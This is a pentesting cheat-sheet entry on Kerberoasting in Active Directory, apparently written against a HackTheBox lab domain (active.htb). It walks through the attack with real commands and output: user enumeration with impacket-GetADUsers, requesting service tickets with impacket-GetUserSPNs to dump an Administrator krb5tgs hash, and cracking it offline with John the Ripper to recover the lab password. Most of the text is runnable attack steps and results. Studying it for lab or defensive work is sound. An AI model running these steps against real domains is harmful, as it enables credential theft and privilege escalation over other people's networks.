# Kerberoasting

Targets service accounts in an Active Directory environment as an authenticated (but low privilege) user. This is done by requesting a service ticket from the TGS which is encrypted with the SPN's password hash. We can then crack the hash offline.

SPN format:

```bash
# Format
<service class>/<host>:<port>

# Examples
HTTP/web04.corp.com:80
```

Perform remotely with [GetUserSPNs](../../14%20Impacket%20Tools/GetUserSPNs.md)

Perform locally with [Rubeus](../0%20Tools/Local/Rubeus.md)

## Enumeration
```
kali@kali ~> impacket-GetADUsers active.htb/SVC_TGS -all -dc-ip 10.10.10.100
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2024-02-13 03:51:09.883745 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 14:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 16:14:38.402764  2024-02-13 04:37:18.576608 
```


## Action

```
kali@kali ~> impacket-GetUserSPNs active.htb/SVC_TGS -dc-ip 10.10.10.100 -outputfile kerberoastables.txt
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-02-13 03:51:09.883745             



[-] CCache file is not found. Skipping...
kali@kali ~> cat kerberoastables.txt
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c53c87592442f618cb27bc8f73be4b89$62d0bfeef615f0f0c778b541bf5ed02f00d51143869949596370d50ffc488780acf0ca304470f0c4c328b78729ecab53968d777ae9f990b22d988e276257e11eb2aadbb9c2b3926e33b86a48899ebe6de35f3b64fa8e96ef97c86f14587ade0f53ed164aa86ea543fbbae8434fc4f0508eba80ac22970e07e5cd53fd149b29fbe4f53766da54861f649deb538ac5826a43dfa2c4d6f9166d0127800f0dbf9b14f8530de142ab89b4035bd1216d80c0e0f3c27e5d07d0bc1375fd1c5e4005105920f2be98a0eb0725e9f4c3b8aa56f10b4a254341e072f1ce5ad471ea7b4486123bc5f947e47e16dbfa1889eee26772692e26888a4766105b63203289268818ea1ab41557ec3a8962dd31b25fbec4ab4a6a374dafa8eedf8db47b3470739ef5c3901576e13fbb5ae42df311770c30bb211c43031c49170d0bccf1eb106ee3b28c110dd9cbce3c7f3427efcacb67b12c4b59b3820119b1025b2e117d621944b2842fee0db79f4fb90281e8d4057cbed4842f540e0046bd80572ebea21278b32b0ed58330143eb2e00ddf47dc7fea8f0ac035f399fce32753d68d58d61513dae814cb5cf501f842eb333d8f7b7b67b5f777d857f6397c8a4a57d75719bf6d132853aa4ddb8dce8b41db2e18365ac07ac556ff67e6de204ac652f8b8b92d72c5e8ef5a266f4b9bb522673945487172e3c7c0f784742298fd888e8e71f9a8cbb1de974c2d5ee08f813b9445414a9b51d0970f1b93905e0fd9e95871403b6df7b35170e6225abf3e23706e0472ab74d74f5aebd23b919c46ca0f1d24c7eaf59530e0179b17ecdd1a1f085d8f2dde22bb65479e2709493a7ae692acf2f9ef75bf318ef044fbf90fd308b78aa0592585a66ee9ccb6dbf8998f11e22d4e51e7270b850b6b3e92d6b432003a93abc9b85832f99a5f60d42822f5fc65d498983e36961ec5ad0602a7084383c1fb8d0f1a7149ef8b506b3038e3cf050014b3a0f0663f40f7f231621c794a4c1c953f6f227a4239a38fc75d020f1ce3502be2411c77948e1a45d9e3937954a2a864047ca6314b151bbfdbd8895982a25498bc5150feacc4cfa600d5aa72439a78ab47923ba9afd091342fe593e8f985990a9491b56f5fe1b1f0582596249038a509fde935ace1757174ed521f4238f2603e804be95c126104726c64051f05198a5576ebabbc0944df2ccb97e669b256ca3adf09353015dd13b7a429ca48b4d44f8814889720d88168b280b9188501d85db9405a
```

## Hash cracking

```
kali@kali ~> john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoastables.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?) <-------------------------------------------- Password
1g 0:00:00:22 DONE (2024-02-13 05:03) 0.04393g/s 463004p/s 463004c/s 463004C/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


